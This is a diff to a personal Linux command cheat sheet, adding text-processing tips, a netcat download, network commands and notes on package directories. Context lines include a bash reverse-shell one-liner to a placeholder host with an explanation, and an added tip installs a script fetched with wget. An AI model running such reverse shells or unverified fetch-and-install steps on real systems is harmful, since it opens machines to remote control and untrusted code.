@@ -177,10 +177,11 @@ Show current location:            pwd
 List directory contents:          ls -la <location = .> (-l: as list, -a: show hidden files, -h: human-readable sizes)
 Shortcut for ls -la:              ll
 Show file content:                cat <file>
-Print first lines of the file:    head [-n <lines>] <file>
-Print last lines of the file:     tail [-n <lines>] <file>
+Print first lines of the file:    head [-<lines>] <file> (10 by default)
+Print last lines of the file:     tail [-<lines>] <file> (10 by default)
 Redirect input to file & stdout:  tee <file> (e.g.: ls -la | tee listing.txt)
-Display specific lines of a file: sed -n '<start_line>[<end_line>]p' <file>
+Print first line:                 head -1
+Print specific lines of a file:   sed -n '<start_line>[<end_line>]p' <file>
 Print columns from tabular data:  awk '{print "Min:", $3, "Max:", $2}' <file>
 Change directory:                 cd <directory> (.: current dir, ..: parent dir)
 Create new empty file:            touch <file>
@@ -229,9 +230,13 @@ Misc commands:
 Print lines with > x chars:       awk 'length($0) > <x>' <file>
 Find length of the longest line:  awk '{ if (length($0) > max) max = length($0) } END { print max }' <file>
 Turn file into string with '\n':  awk '$1=$1' ORS='\\n' <file>
+Print odd/even lines:             sed -n 'p;n' | sed -n 'n;p'
+Print prefix before symbol:       grep -o '[^<symbol>]*' | head -1
 Run VLC from CLI:                 cvlc --play-and-exit audio.mp3 
+Read PDF:                         atril <pdf_file>
+Open dir in file manager:         thunar <dir> (thunar is the file manager for the Xfce Desktop Environment)
 Decrypt PDF:                      qpdf --password=<pass> --decrypt <input> <output>
-Translator (Translate Shell):     trans [-b|-brief] [source=en]:[target=en] [word | phrase] (langs use a two-letter code, read them all with trans -R)
+Translator (Translate Shell):     trans [-b|-brief] [source=en]:[target=en] [word | phrase] (langs use a two-letter code, read them all with 'trans -R'; install with 'apt install gawk && wget git.io/trans && chmod +x trans && mv trans /usr/local/bin')
 
 
 Networking:
@@ -241,12 +246,13 @@ Web browser:                      links2 <url>
 Connect to a VPN:                 sudo openvpn <vpn_key_file>
 SSH into a machine:               ssh <user>@<ip> (you'll be prompted for a pass; add '<command> >> <local_file>' to send output to local file)
 Connect to ProtonVPN:             protonvpn-cli
-Get private IPs:                  ip a | grep 'inet '
-Get public IP:                    curl -L ipinfo.io/ip
+Get private IPs:                  ip -4 -o a | awk '{print $4}' 
+Get public IP:                    curl -sL ipinfo.io/ip
 Show active network interfaces:   ifconfig
 Show accesible networks:          netstat -rn
-Download file from server - wget: wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
-Download file from server - curl: curl -L <url> -o <file>
+Download file using wget:         wget <url> (wget supports HTTP, HTTPS, and FTP; see curl for a powerful alternative to transfer data from or to a server)
+Download file using curl:         curl -L <url> -o <file>
+Download file using netcat:       printf 'GET /<relative_path> \n' | nc <host> <port> > <filename> 
 Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
 Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
 The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
@@ -408,7 +414,7 @@ Pressing Ctrl+Z sends the TSTP signal to your process. This halts execution (the
 The shell has the functionality to 'background' the process, but this is a relationship between the shell and the process. The process itself doesn't really have the concept of 'background' or 'foreground'.
 
 
-Package management:
+Package management (software / apps / executables):
 
 A package manager is a tool that allows users to install, remove, upgrade, configure and manage software packages on an operating system. The package manager can be a graphical application like a software center like Discover or a command line tool like apt or pacman.
 Dpkg is a base package management system for the Debian Linux family (which includes Ubuntu, Linux Mint, Kali Linux and Parrot OS), it is used to install, remove, store and provide information about .deb packages. It is a low-level tool and there are front-end tools that help users to obtain packages from remote repositories and/or handle complex package relations and these include: APT (Advanced Packaging Tool), Aptitude Package Manager, and Synaptic Package Manager.
@@ -434,6 +440,26 @@ Common commands in apt:
 To install a package from a .deb file use:
 1. sudo dpkg -i <file>
 2. If install fails due to missing dependencies use 'apt-get -f install' and install igain
+
+Where to place executables or whole packages:
+/                     System-wide essential packages
+/usr                  Software installed from the distribution's packages
+/usr/local            Locally compiled and installed software packages
+$HOME | $HOME/.local  Only user packages
+
+* The idea behind this separation is to avoid clashes with distributed software.
+* The Filesystem Hierarchy Standard (FHS) defines the structure of file systems on Linux and other UNIX-like operating systems.
+* The directories used for packages (/usr, /usr/local, etc) have the following hierarchy:
+    /bin      binaries
+    /etc      Host-specific system configuration for binaries
+    /games    Game binaries
+    /include  C header files
+    /lib      Libraries
+    /lib64    64-bit libraries
+    /man      Online manuals
+    /sbin     System binaries
+    /share    Architecture-independent hierarchy
+    /src      Source code
 
 
 Automation:
